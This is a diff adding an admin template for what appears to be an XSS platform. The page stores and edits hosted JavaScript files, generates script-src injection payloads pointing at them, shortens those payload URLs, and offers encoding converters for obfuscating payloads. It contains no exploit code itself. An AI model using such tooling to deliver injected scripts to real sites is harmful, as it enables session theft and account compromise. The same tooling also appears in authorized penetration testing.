@@ -1,0 +1,228 @@
+{extend name="Admin/base" /}
+{block name="title"}{/block}
+{block name="body"}
+<style>
+        #daohang .list-group{
+            height:450px;
+            overflow: hidden;
+            overflow-y: visible;
+        }
+        #editor {
+        position: relative;
+        width: 560px;
+        height: 550px;
+        }
+</style>
+<script src="/public/static/js/js_encode.min.js"></script>
+<div class="container">
+    <div class="row">
+        <!-- 左侧 -->
+        <div class="co-xs-12 col-sm-2 col-md-2 col-lg-2" id="daohang">
+            <div class="list-group">
+                {foreach $list_js as $vo}
+                <a href="#"  class="list-group-item filename">{$vo.filename}</a>
+                {/foreach}
+            </div>
+            <a href="#" class="btn btn-info btn-lg addfile">增加JS文件</a>
+        </div>
+        <!-- 中间 -->
+        <div class="co-xs-12 col-sm-6 col-md-6 col-lg-6">
+            <div id="editor"></div>
+        </div>
+
+        <!-- 右侧 -->
+        <div class="co-xs-12 col-sm-4 col-md-4 col-lg-4">
+                <div class="form-group">
+                    <label>JS文件名</label>
+                        <input type="text" class="form-control" id="file_name" placeholder="exp.js"></input>
+                </div>
+                <div class="form-group">
+                    <label>描述</label>
+                    <textarea class="form-control" rows="2" id="description"></textarea>
+                </div>
+                <div id="xssorWindow" class="windows">
+                        <div id="Ww_B_0" class="Ww_B">
+                            <div id="Ww_B_0_Left">
+                                <label>payload</label>
+                                <textarea class="form-control payload" rows="2" id="Ww_B_0_textarea"></textarea>
+                            </div>
+                            <div id="Ww_B_0_Right">
+                                <input type="button" id="rwb_b2" value="→16en" />
+                                <input type="button" id="rwb_b2_j" value="De" />
+                                
+                                <input type="radio" name="rwb_b2_c" id="rwb_b2_c1" checked="checked" />\u<input type="radio" name="rwb_b2_c" id="rwb_b2_c2" />&amp;#x;<br />
+                                
+                                <input type="button" id="rwb_b1" value="→10en" />  <input type="button" id="rwb_b1_j" value="De" />
+                                
+                                <input type="radio" name="rwb_b1_c" id="rwb_b1_c1" checked="checked" />,<input type="radio" name="rwb_b1_c" id="rwb_b1_c4" />c<input type="radio" name="rwb_b1_c" id="rwb_b1_c2" />&amp;#<input type="radio" name="rwb_b1_c" id="rwb_b1_c3" />&amp;#;
+                                <br />
+                                
+                                <input type="button" id="rwb_b3" value="escape" /> <span style="font-size:18px">&harr;</span> 
+                                <input type="button" id="rwb_b3j" value="unescape"  />
+                                <br />
+                                
+                                <input type="button" id="rwb_b4" value="encodeURI" /> 
+                                <span style="font-size:18px">&harr;</span> 
+                                <input type="button" id="rwb_b4j" value="decodeURI" />
+                                <br />
+                                
+                                <input type="button" id="rwb_b5" value="Html2JS" /> 
+                                <span style="font-size:18px">&harr;</span> 
+                                <input type="button" id="rwb_b5j" value="JS2Html" />
+                                <br />
+                                
+                                <input type="button" id="rwb_b6" value="HtmlEncode" /> 
+                                <span style="font-size:18px">&harr;</span> 
+                                <input type="button" id="rwb_b6j" value="HtmlDecode" />
+                                <br />
+                                
+                                <input type="button" id="rwb_b7" value="base64En" /> 
+                                <span style="font-size:18px">&harr;</span> 
+                                <input type="button" id="rwb_b7j" value="base64De" />
+                                
+                                <br /><br />
+                                
+                                <input type="button" id="rwb_b8" value="replace" />
+                                <input type="text" name="oldC" id="oldC" size="5" /> 
+                                <span style="font-size:18px">&rarr;</span> 
+                                <input type="text" name="newC" id="newC" size="5" />
+                                
+                                <br /><br />
+                                
+                            </div>
+                        </div>
+                    </div>
+                <input type="submit" class="btn btn-default" onclick="submitbody();" value="JS保存"></input>
+                <button type="button" class="btn btn-danger" onclick="delFile();">JS删除</button>
+                <button type="button" class="btn btn-info" onclick="apiShortUrl();">URL短链接</button>
+        </div>
+        </div>
+</div>
+<script>
+    $("#rwb_b2").click(function () {
+        knownxss.encode.en(16);
+    });
+    $("#rwb_b2_j").click(function () {
+        knownxss.encode.de(16)
+    });
+    $("#rwb_b1").click(function () {
+        knownxss.encode.en(10)
+    });
+    $("#rwb_b1_j").click(function () {
+        knownxss.encode.de(10)
+    });
+    $("#rwb_b3").click(function () {
+        knownxss.encode._escape()
+    });
+    $("#rwb_b3j").click(function () {
+        knownxss.encode._unescape()
+    });
+    $("#rwb_b4").click(function () {
+        knownxss.encode._encodeURI()
+    });
+    $("#rwb_b4j").click(function () {
+        knownxss.encode._decodeURI()
+    });
+    $("#rwb_b5").click(function () {
+        knownxss.encode.html2js(1)
+    });
+    $("#rwb_b5j").click(function () {
+        knownxss.encode.html2js(2)
+    });
+    $("#rwb_b6").click(function () {
+        knownxss.encode.htmlencode(1)
+    });
+    $("#rwb_b6j").click(function () {
+        knownxss.encode.htmlencode(2)
+    });
+    $("#rwb_b7").click(function () {
+        knownxss.encode.base64Code(1)
+    });
+    $("#rwb_b7j").click(function () {
+        knownxss.encode.base64Code(2)
+    });
+    $("#rwb_b8").click(function () {
+        knownxss.encode.replaceC()
+    });
+    $(function(){
+        $('.list-group-item').click(function(){
+            $(this).addClass("active");
+            $(this).siblings().removeClass("active");
+        });
+    });
+    function submitbody(){
+        var code = editor.getValue();
+        var filename = $("#file_name").val();
+        var description = $("#description").val();
+        if(code.length==0 || filename.length==0 || description.length==0)
+        {
+            alert("代码、名字、描述都为必填项");
+            return;
+        }
+        $.post("{:url('File/saveFile')}", {"code": code, "filename": filename, "description": description},function(result){
+            if(result){
+                alert(result);
+                window.location.reload();
+            }
+                
+        });
+    }
+    function delFile(){
+        var filename = $("#file_name").val();
+        if(filename.length == 0){
+            return;
+        }else{
+            $.post("{:url('File/delFile')}", {"filename": filename}, function(result){
+                if(result){
+                    alert(result);
+                    window.location.reload();
+                }
+                    
+            });
+        }
+    }
+    function apiShortUrl(){
+        var payload = $(".payload").html();
+        var patt = new RegExp('src="(.*?)"')
+        payload = patt.exec(payload)[1]; 
+        $.post("{:url('File/shortUrl')}", {"payload": payload}, function(result){
+            if(result)
+                payload = "&lt;script src=&quot;" + result + "&quot;&gt;&lt;/scirpt&gt;";
+                $(".payload").html(payload);
+        })
+    }
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.2/ace.js" type="text/javascript" charset="utf-8"></script>
+<script>
+        var editor = ace.edit("editor");
+        //editor.setTheme("ace/theme/god");
+        editor.getSession().setMode("ace/mode/javascript");
+</script>
+<script>
+    $(function(){
+        $(".filename").click(function(){
+            var filename = $(this).html();
+            var payload = "&lt;script src=&quot;" + document.location.protocol + "//" + document.location.host + "/public/uploads/js/" + filename + "&quot;&gt;&lt;/scirpt&gt;";
+            $(".payload").html(payload);
+            $.post("{:url('File/getFileInfo')}", {"filename": filename}, function(js_info){
+                var code = js_info['code'];
+                var description = js_info['description'];
+                editor.setValue(code);
+                $("#file_name").attr("value", filename);
+                $("#description").html(description);
+            });
+
+        });
+    });
+    $(function(){
+        $(".addfile").click(function(){
+            editor.setValue("");
+            $("#file_name").attr("value", "");
+            $("#description").html("");
+            $("#Ww_B_0_textarea").html("");
+
+        });
+    });
+</script>
+{/block}
